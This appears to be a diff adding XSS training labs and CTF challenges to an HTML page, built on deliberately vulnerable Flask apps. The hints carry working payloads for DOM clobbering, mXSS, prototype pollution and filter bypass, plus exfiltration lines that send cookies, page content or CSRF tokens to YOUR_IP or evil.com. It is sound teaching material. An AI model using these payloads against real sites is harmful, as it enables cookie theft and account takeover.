+        <div class="lab-card">
+          <h4>Lab 8: DOM Clobbering</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use DOM clobbering to overwrite a JavaScript variable and redirect script execution.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- dom-clobber.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;div id="user-content"&gt;&lt;!-- user HTML injected here --&gt;&lt;/div&gt;
+  &lt;script&gt;
+    // Expects window.config to be set by a config script
+    let url = window.config?.baseUrl || 'https://safe.example.com';
+    let s = document.createElement('script');
+    s.src = url + '/analytics.js';
+    document.body.appendChild(s);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>The page loads a script from <code>window.config.baseUrl</code> if defined</li>
+              <li>HTML injection is available but <code>&lt;script&gt;</code> tags are stripped</li>
+              <li>Use DOM clobbering: inject <code>&lt;a id="config" href="https://evil.com"&gt;</code></li>
+              <li><code>window.config</code> now references the anchor element, and <code>.baseUrl</code> won't match but <code>toString()</code> returns the href</li>
+              <li>Advanced: use <code>&lt;form id="config"&gt;&lt;input name="baseUrl" value="https://evil.com"&gt;&lt;/form&gt;</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Mutation XSS (mXSS)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Craft a payload that passes sanitization but mutates into executable HTML when re-parsed by the browser.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — mXSS lab using DOMPurify older version behavior
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    html = request.args.get('html', '')
+    return f'''&lt;html&gt;
+&lt;head&gt;&lt;script src="https://cdn.jsdelivr.net/npm/dompurify@2.0.0/dist/purify.min.js"&gt;&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;div id="output"&gt;&lt;/div&gt;
+&lt;script&gt;
+  let dirty = {repr(html)};
+  let clean = DOMPurify.sanitize(dirty);
+  document.getElementById("output").innerHTML = clean;
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;'''
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-markup">&lt;!-- Classic mXSS vectors --&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/math&gt;
+&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id="&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/svg&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;img src=x onerror=alert(1)&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Try basic XSS — DOMPurify strips it</li>
+              <li>Research mXSS: the browser's HTML parser re-interprets markup differently than the sanitizer expected</li>
+              <li>Test math/svg namespace confusion payloads above</li>
+              <li>The key: sanitizer parses in one context, browser re-parses in another, creating new executable elements</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Prototype Pollution to XSS</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a prototype pollution gadget that leads to XSS via a templating engine.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- pp-xss.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;div id="output"&gt;&lt;/div&gt;
+&lt;script&gt;
+  // Vulnerable merge function
+  function merge(target, source) {
+    for (let key in source) {
+      if (typeof source[key] === 'object' &amp;&amp; source[key] !== null) {
+        if (!target[key]) target[key] = {};
+        merge(target[key], source[key]);
+      } else {
+        target[key] = source[key];
+      }
+    }
+  }
+
+  // User-controlled JSON (from URL param)
+  let params = JSON.parse(decodeURIComponent(location.hash.substring(1) || '{}'));
+  let config = {};
+  merge(config, params);
+
+  // Gadget: template rendering checks config.template
+  let template = config.template || '&lt;p&gt;Welcome!&lt;/p&gt;';
+  document.getElementById('output').innerHTML = template;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Visit the page — shows "Welcome!"</li>
+              <li>Pollute <code>Object.prototype.template</code> via the hash: <code>#{"__proto__":{"template":"&lt;img src=x onerror=alert(1)&gt;"}}</code></li>
+              <li>Or set config.template directly: <code>#{"template":"&lt;img src=x onerror=alert(1)&gt;"}</code></li>
+              <li>Understand the difference: direct property vs prototype chain pollution</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: XSS via File Upload Name</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a file listing page that renders upload filenames without sanitization.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — XSS via filename
+from flask import Flask, request
+import os
+
+app = Flask(__name__)
+UPLOAD_DIR = 'uploads'
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        f = request.files.get('file')
+        if f:
+            f.save(os.path.join(UPLOAD_DIR, f.filename))
+    files = os.listdir(UPLOAD_DIR)
+    html = '&lt;h1&gt;Files&lt;/h1&gt;&lt;ul&gt;'
+    for name in files:
+        html += f'&lt;li&gt;{name}&lt;/li&gt;'  # No sanitization!
+    html += '&lt;/ul&gt;&lt;form method="POST" enctype="multipart/form-data"&gt;'
+    html += '&lt;input type="file" name="file"&gt;&lt;button&gt;Upload&lt;/button&gt;&lt;/form&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Upload a normal file — see it listed</li>
+              <li>Intercept the upload request in Burp and change the filename in the multipart body to <code>&lt;img src=x onerror=alert(1)&gt;.txt</code></li>
+              <li>The filename is rendered unsanitized in the file listing</li>
+              <li>Try storing an XSS payload that exfiltrates cookies of anyone viewing the file list</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Content-Type Sniffing XSS</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Upload a file that the browser interprets as HTML despite having a non-HTML extension, due to MIME sniffing.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Content-Type sniffing XSS
+from flask import Flask, request, send_from_directory
+import os
+
+app = Flask(__name__)
+UPLOAD_DIR = 'uploads'
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        f = request.files.get('file')
+        if f:
+            f.save(os.path.join(UPLOAD_DIR, f.filename))
+            return f'&lt;p&gt;Uploaded! &lt;a href="/files/{f.filename}"&gt;View&lt;/a&gt;&lt;/p&gt;'
+    return '''&lt;h1&gt;Upload&lt;/h1&gt;
+    &lt;form method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="file"&gt;&lt;button&gt;Upload&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/files/&lt;path:name&gt;')
+def serve(name):
+    # Bug: serves without X-Content-Type-Options header
+    # and doesn't force Content-Type based on extension
+    return send_from_directory(UPLOAD_DIR, name)
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Create a file named <code>test.jpg</code> with content <code>&lt;html&gt;&lt;body&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></li>
+              <li>Upload it — some browsers sniff the content and render it as HTML</li>
+              <li>Note: modern browsers with <code>X-Content-Type-Options: nosniff</code> prevent this</li>
+              <li>Observe the difference when the header is present vs absent</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Cookie Monster</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Steal the admin bot's cookie via reflected XSS on a search page. The flag is in the cookie.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, make_response
+import requests, threading
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    return f'&lt;h1&gt;Results&lt;/h1&gt;&lt;p&gt;Query: {q}&lt;/p&gt;'
+
+@app.route('/report')
+def report():
+    """Admin bot visits a URL you provide"""
+    url = request.args.get('url', '')
+    def visit():
+        import time
+        from selenium import webdriver
+        driver = webdriver.Chrome()
+        driver.get('http://localhost:5000/')
+        driver.add_cookie({'name': 'flag', 'value': 'FLAG{xss_cookie_steal_101}'})
+        driver.get(url)
+        time.sleep(3)
+        driver.quit()
+    threading.Thread(target=visit).start()
+    return 'Admin will visit your URL shortly.'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># Start your cookie receiver first
+# python3 -m http.server 8888
+# or use the receiver script from the Notes tab</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Start your cookie receiver on port 8888.<br>
+            2. Craft a reflected XSS URL: <code>/search?q=&lt;script&gt;fetch('http://YOUR_IP:8888/?c='+document.cookie)&lt;/script&gt;</code><br>
+            3. Submit the full URL to <code>/report?url=...</code> so the admin bot visits it.<br>
+            4. Check your receiver — the admin's cookie contains the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: CSP Crusher</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Execute JavaScript on a page protected by CSP. The flag is in an admin-only API endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — CSP challenge
+from flask import Flask, request, make_response
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args.get('name', 'guest')
+    resp = make_response(f'''&lt;html&gt;
+    &lt;head&gt;&lt;meta http-equiv="Content-Security-Policy"
+          content="script-src 'self' https://cdn.jsdelivr.net"&gt;&lt;/head&gt;
+    &lt;body&gt;
+    &lt;h1&gt;Hello, {name}&lt;/h1&gt;
+    &lt;/body&gt;&lt;/html&gt;''')
+    return resp
+
+@app.route('/api/flag')
+def flag():
+    # Requires same-origin request (cookie check simulated)
+    return 'FLAG{csp_bypass_jsonp_ftw}'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> Inline <code>&lt;script&gt;</code> is blocked by CSP — <code>script-src 'self' https://cdn.jsdelivr.net</code>.<br>
+            <strong>Step 2:</strong> cdn.jsdelivr.net hosts arbitrary npm packages. You can load any JS file from npm via jsdelivr.<br>
+            <strong>Step 3:</strong> Create a payload that uses <code>&lt;script src="https://cdn.jsdelivr.net/..."&gt;</code> to load a script that fetches <code>/api/flag</code> and exfiltrates it.<br>
+            <strong>Step 4:</strong> Alternatively, check if jsdelivr has JSONP-like endpoints or use a pre-existing npm package with useful code.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Ghost in the Machine</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Blind XSS — inject a payload that fires when an admin reviews user-submitted support tickets. Exfiltrate the admin panel's page content which contains the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Blind XSS challenge
+from flask import Flask, request
+import threading
+
+app = Flask(__name__)
+tickets = []
+
+@app.route('/submit', methods=['GET', 'POST'])
+def submit():
+    if request.method == 'POST':
+        tickets.append({
+            'name': request.form.get('name', ''),
+            'message': request.form.get('message', '')
+        })
+        return '&lt;p&gt;Ticket submitted. An admin will review it shortly.&lt;/p&gt;'
+    return '''&lt;form method="POST"&gt;
+    &lt;input name="name" placeholder="Name"&gt;
+    &lt;textarea name="message" placeholder="Describe your issue"&gt;&lt;/textarea&gt;
+    &lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/admin/tickets')
+def admin_tickets():
+    html = '&lt;h1&gt;Admin Panel — FLAG{bl1nd_xss_exf1ltrat10n}&lt;/h1&gt;'
+    for t in tickets:
+        html += f'&lt;div&gt;&lt;b&gt;{t["name"]}&lt;/b&gt;: {t["message"]}&lt;/div&gt;&lt;hr&gt;'
+    return html
+
+def admin_bot():
+    """Simulates admin checking tickets every 30 seconds"""
+    import time
+    from selenium import webdriver
+    while True:
+        time.sleep(30)
+        try:
+            driver = webdriver.Chrome()
+            driver.get('http://localhost:5000/admin/tickets')
+            time.sleep(5)
+            driver.quit()
+        except: pass
+
+threading.Thread(target=admin_bot, daemon=True).start()
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> Set up your exfiltration receiver: <code>python3 -c "from http.server import *; HTTPServer(('0.0.0.0',8888),SimpleHTTPRequestHandler).serve_forever()"</code><br>
+            <strong>Step 2:</strong> Submit a ticket with a blind XSS payload in the name or message field. The payload should grab <code>document.body.innerHTML</code> and send it to your server.<br>
+            <strong>Step 3:</strong> Payload example: <code>&lt;img src=x onerror="fetch('http://YOUR_IP:8888/?d='+btoa(document.body.innerHTML))"&gt;</code><br>
+            <strong>Step 4:</strong> Wait for the admin bot to visit <code>/admin/tickets</code>. Decode the Base64 data — the flag is in the page title.<br>
+            <strong>Step 5:</strong> For a stealthier approach, use XSS Hunter — it captures screenshots, cookies, and full DOM automatically.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: XSS with Length Limit</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The input field is limited to 25 characters. Execute <code>alert(1)</code> within this constraint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    if len(q) &gt; 25:
+        return '&lt;p&gt;Input too long! Max 25 chars.&lt;/p&gt;'
+    return f'&lt;p&gt;Results for: {q}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Try short payloads:<br>
+            <code>&lt;svg onload=alert(1)&gt;</code> (22 chars)<br>
+            <code>&lt;img src=x onerror=alert(1)&gt;</code> is 28 — too long.<br>
+            <code>&lt;svg/onload=alert(1)&gt;</code> (21 chars) also works.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: XSS Without Parentheses</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The WAF blocks all parentheses <code>()</code>. Achieve JavaScript execution without using them.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    if '(' in q or ')' in q:
+        return '&lt;p&gt;Parentheses blocked!&lt;/p&gt;'
+    return f'&lt;p&gt;{q}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Techniques without parentheses:<br>
+            <code>&lt;img src=x onerror="window.onerror=alert;throw 1"&gt;</code><br>
+            <code>&lt;svg onload="location='javascript:alert\x281\x29'"&gt;</code> (hex-encoded parens in string)<br>
+            <code>&lt;img src=x onerror=alert`1`&gt;</code> — template literals replace parens for tagged templates.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: XSS Without Script Tags</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">The server strips <code>&lt;script&gt;</code> tags. Find an alternative way to execute JavaScript.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+import re
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    q = re.sub(r'&lt;/?script[^&gt;]*&gt;', '', q, flags=re.IGNORECASE)
+    return f'&lt;p&gt;{q}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Many tags support event handlers:<br>
+            <code>&lt;img src=x onerror=alert(1)&gt;</code><br>
+            <code>&lt;svg onload=alert(1)&gt;</code><br>
+            <code>&lt;body onload=alert(1)&gt;</code><br>
+            <code>&lt;details open ontoggle=alert(1)&gt;</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Dangling Markup Exfiltration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">CSP blocks all script execution. Use dangling markup injection to exfiltrate sensitive data (CSRF token) from the page.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, make_response
+import secrets
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    token = secrets.token_hex(16)
+    name = request.args.get('name', 'guest')
+    resp = make_response(f'''&lt;html&gt;
+    &lt;head&gt;&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none'"&gt;&lt;/head&gt;
+    &lt;body&gt;
+    &lt;h1&gt;Hello, {name}&lt;/h1&gt;
+    &lt;form action="/transfer"&gt;
+      &lt;input type="hidden" name="csrf" value="{token}"&gt;
+      &lt;button&gt;Transfer Funds&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;&lt;/html&gt;''')
+    return resp
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>CSP blocks JS entirely — but you can still inject HTML.<br>
+            Inject an unclosed <code>&lt;img src="https://evil.com/steal?</code> tag — it consumes everything after it (including the CSRF token) as part of the URL until it hits a matching quote.<br>
+            The browser sends a request to your server with the page content in the URL.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: mXSS via Sanitizer Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The app uses DOMPurify to sanitize input. Craft a mutation XSS payload that survives sanitization.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    html = request.args.get('html', '')
+    return f'''&lt;html&gt;
+&lt;head&gt;&lt;script src="https://cdn.jsdelivr.net/npm/dompurify@2.0.0/dist/purify.min.js"&gt;&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;div id="output"&gt;&lt;/div&gt;
+&lt;script&gt;
+  let clean = DOMPurify.sanitize({repr(html)});
+  document.getElementById("output").innerHTML = clean;
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;'''
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>mXSS exploits differences between how the sanitizer parses HTML vs how the browser re-parses the sanitized output.<br>
+            Try math/SVG namespace confusion:<br>
+            <code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/math&gt;</code><br>
+            The sanitizer sees the img inside a style block (safe), but the browser's parser ejects the table, re-parsing the img tag as active HTML.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: XSS to CSRF Chain</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Use a stored XSS vulnerability to forge a password change request for another user.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, session
+import secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+comments = []
+users = {'admin': 'admin123', 'victim': 'victim123'}
+
+@app.route('/comment', methods=['GET', 'POST'])
+def comment():
+    if request.method == 'POST':
+        comments.append(request.form.get('msg', ''))
+    html = '&lt;h1&gt;Comments&lt;/h1&gt;'
+    for c in comments:
+        html += f'&lt;div&gt;{c}&lt;/div&gt;&lt;hr&gt;'
+    html += '&lt;form method="POST"&gt;&lt;textarea name="msg"&gt;&lt;/textarea&gt;&lt;button&gt;Post&lt;/button&gt;&lt;/form&gt;'
+    return html
+
+@app.route('/change-password', methods=['POST'])
+def change_pw():
+    user = request.form.get('username', '')
+    new_pw = request.form.get('new_password', '')
+    if user in users:
+        users[user] = new_pw
+        return f'&lt;p&gt;Password changed for {user}! FLAG{{xss_csrf_chain}}&lt;/p&gt;'
+    return '&lt;p&gt;User not found&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Post a comment with a stored XSS payload that auto-submits a form to <code>/change-password</code>:<br>
+            <code>&lt;img src=x onerror="fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=admin&amp;new_password=hacked'})"&gt;</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: XSS in Markdown Parser</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A note-taking app renders user markdown. Find a payload that bypasses the markdown parser's sanitization.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — requires: pip install markdown
+from flask import Flask, request
+import markdown
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    rendered = ''
+    if request.method == 'POST':
+        md = request.form.get('note', '')
+        rendered = markdown.markdown(md)
+    return f'''&lt;h1&gt;Notes&lt;/h1&gt;
+    &lt;form method="POST"&gt;&lt;textarea name="note" rows="10" cols="50"&gt;&lt;/textarea&gt;
+    &lt;br&gt;&lt;button&gt;Render&lt;/button&gt;&lt;/form&gt;
+    &lt;hr&gt;&lt;div&gt;{rendered}&lt;/div&gt;'''
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Python's <code>markdown</code> library doesn't sanitize HTML by default — raw HTML passes through.<br>
+            Try: <code>&lt;img src=x onerror=alert(1)&gt;</code> directly in the markdown input.<br>
+            Also try markdown link syntax with javascript: <code>[click](javascript:alert(1))</code></p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
